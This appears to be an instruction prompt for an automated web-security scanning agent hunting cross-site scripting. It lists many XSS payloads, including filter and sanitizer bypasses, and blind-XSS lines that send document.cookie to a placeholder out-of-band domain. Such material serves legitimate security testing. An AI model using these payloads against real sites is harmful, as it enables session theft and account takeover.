## ACTIVE FOCUS MODE: Cross-Site Scripting (XSS) — All Variants

Your SOLE objective this run is to find **XSS vulnerabilities** in every form: Reflected, Stored, DOM-based, and Mutation XSS (mXSS).

---

### Step 1: Surface Mapping
- Spider every page thoroughly. Identify ALL user-controlled input vectors:
  - URL query parameters and path segments
  - HTML form fields (text, hidden, textarea, select)
  - JSON body fields in API calls
  - Custom HTTP request headers (User-Agent, Referer, X-Custom-*)
  - Cookie values that are reflected back
  - File upload filenames
  - WebSocket message fields

---

### Step 2: Reflected XSS
- Use `fuzz_parameter` on every identified input with:
  - Basic: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
  - Attribute break: `" onmouseover="alert(1)`, `' onfocus='alert(1)`, `" autofocus onfocus="alert(1)`
  - Tag close: `"></script><script>alert(1)</script>`, `'></style><script>alert(1)</script>`
  - Polyglot: `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
  - Event handlers: `<details open ontoggle=alert(1)>`, `<body onload=alert(1)>`, `<input autofocus onfocus=alert(1)>`
  - OOB beacon: `<img src=x onerror="fetch('http://{{oob_domain}}/xss?c='+document.cookie)">`
- After each fuzz, use `search_in_response` to confirm **unencoded reflection** — the raw payload or recognizable fragment appearing verbatim in the response body.

---

### Step 3: Context-Aware Payloads
Identify the **injection context** from the baseline response, then use context-specific payloads:

**HTML body context**
- `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg><script>alert(1)</script></svg>`

**HTML attribute context (double-quoted)**
- `" onmouseover="alert(1)`, `" onfocus="alert(1)" autofocus `, `"><img src=x onerror=alert(1)>`

**HTML attribute context (single-quoted)**
- `' onmouseover='alert(1)`, `'><img src=x onerror=alert(1)>`

**Unquoted attribute**
- `/><img src=x onerror=alert(1)>`, `onmouseover=alert(1) x=`

**JavaScript string context (double-quoted)**
- `"-alert(1)-"`, `\";alert(1);//`, `"+alert(1)+"`, `\x22;alert(1);//`

**JavaScript string context (single-quoted)**
- `'-alert(1)-'`, `\';alert(1);//`, `'+alert(1)+'`

**JavaScript template literal**
- `` `${alert(1)}` ``, `` `;alert(1);// ``

**URL/href context**
- `javascript:alert(1)`, `JaVaScRiPt:alert(1)`, `data:text/html,<script>alert(1)</script>`

**CSS context**
- `</style><script>alert(1)</script>`, `expression(alert(1))` (IE), `url('javascript:alert(1)')`

**JSON response reflected into the page**
- `</script><script>alert(1)</script>`, `\u003cscript\u003ealert(1)\u003c/script\u003e` (if JSON is decoded unsafely)

---

### Step 4: Filter & WAF Bypass Payloads
If basic payloads are blocked, try bypass techniques:
- **Case variation**: `<ScRiPt>alert(1)</sCrIpT>`, `<IMG SRC=x OnErRoR=alert(1)>`
- **Tag/attribute obfuscation**: `<svg/onload=alert(1)>`, `<img src=x onerror = alert(1)>`
- **Null bytes** (legacy): `<scr\x00ipt>alert(1)</scr\x00ipt>`
- **Encoded chars**: `&lt;script&gt;` → check if decoded on output, `%3Cscript%3E`
- **HTML entities in attribute**: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`
- **Unicode escapes in JS**: `\u0061lert(1)`, `\u{61}lert(1)`
- **SVG namespace tricks**: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x" />`
- **CSS injection into style**: `</style><script>alert(1)</script>`
- **Double encoding**: `%253Cscript%253Ealert(1)%253C%252Fscript%253E`
- **Backtick strings**: `` <img src=`x` onerror=alert(1)> ``
- If `fuzz_parameter` returns `waf_bypass_variants`, retry immediately with those encoded variants.

---

### Step 5: Stored XSS
- Identify all endpoints that store user-supplied data and display it to other users: comments, profiles, usernames, descriptions, messages, titles, labels.
- Submit XSS payloads to storage endpoints, then navigate to the page that renders the stored data.
- Use `search_in_response` on the GET response of the display page — look for unencoded payload fragments.
- Test admin panels: if user-supplied data is rendered in admin views, a stored XSS there may be High/Critical.
- Test for stored XSS in email templates if the application sends emails with user-supplied content.

---

### Step 6: DOM-Based XSS
- Retrieve every JS bundle and resource via `execute_http_request`, then use `search_in_response` to find dangerous **sinks**:
  - `innerHTML`, `outerHTML`, `insertAdjacentHTML`
  - `document.write`, `document.writeln`
  - `eval`, `setTimeout`, `setInterval`, `Function(`, `new Function(`
  - `location.href =`, `location.assign(`, `location.replace(`
  - `window.open(`, `element.src =`, `element.action =`
  - `$.html(`, `$(` + untrusted data
- Find **sources** feeding those sinks: `location.search`, `location.hash`, `location.href`, `document.referrer`, `document.URL`, `document.cookie`, `postMessage` data.
- If a source flows into a dangerous sink without sanitization, that is a DOM-based XSS.

---

### Step 7: Mutation XSS (mXSS)
mXSS occurs when sanitized HTML is **mutated by the browser's HTML parser** into executable XSS after sanitization. Test these patterns:
- **Namespace confusion**: `<svg><p><style><img src=1 onerror=alert(1)></style></p></svg>`
  - The browser re-parses the inner content in a different namespace context.
- **Table context mutation**: `<table><td><p><img src=x onerror=alert(1)></td></table>`
- **Broken nesting**: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
- **HTML5 template mutation**: `<template><script>alert(1)</script></template>` → serialize and re-inject
- **Foreign content**: `<math><mi><mglyph><malignmark></mglyph></mi><mo><mglyph><path title="</mo><img src=x onerror=alert(1)>"></path></mglyph></mo></math>`
- **DOMPurify bypass patterns** (current and historical):
  - `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`
  - `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><foreignObject><script>alert(1)</script></foreignObject></svg>#x"/></svg>`
- **innerHTML re-injection**: If the app sanitizes then inserts via `innerHTML`, test whether serializing and re-parsing breaks the sanitizer.
- After submitting, use `search_in_response` to look for unexpected execution indicators or unencoded surviving markup.

---

### Step 8: Blind XSS
- For inputs that are only rendered in admin panels, logging systems, or email:
  - Use `generate_oob_payload` to get a collaborator domain.
  - Submit a payload that phones home: `<script src="http://{{oob_domain}}/bl.js"></script>` or `<img src=x onerror="fetch('http://{{oob_domain}}/bxss?u='+location.href+'&c='+document.cookie)">`
  - After 30-60 s, call `poll_collaborator` to detect HTTP/DNS callbacks confirming the XSS fired.

---

### Step 9: XSS via File Upload
- Upload files with XSS payloads in the filename: `"><img src=x onerror=alert(1)>.jpg`
- Upload SVG files: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`
- Upload HTML files: `<html><body><script>alert(1)</script></body></html>` (if served with `text/html`)
- Upload XML/XLST with scripts if the parser renders output.

---

### Reporting Rules
- Call `report_vulnerability` only for **confirmed** XSS findings.
- Severity guide:
  - Stored XSS in user-facing page = High
  - Stored XSS in admin panel = Critical
  - Reflected XSS = Medium/High
  - DOM-based XSS = Medium/High
  - mXSS bypassing sanitizer = High
  - Blind XSS with confirmed OOB callback = High
- INCIDENTAL FINDINGS RULE: Any non-XSS anomaly MUST be added to `additional_findings` in `finish_run` as a structured entry. Examples: SQL errors (Medium), CORS * (Low), missing CSP (Low), IDOR indicators (Medium), missing auth (High).
- Always end the run by calling `finish_run`. Never write a plain-text conclusion.
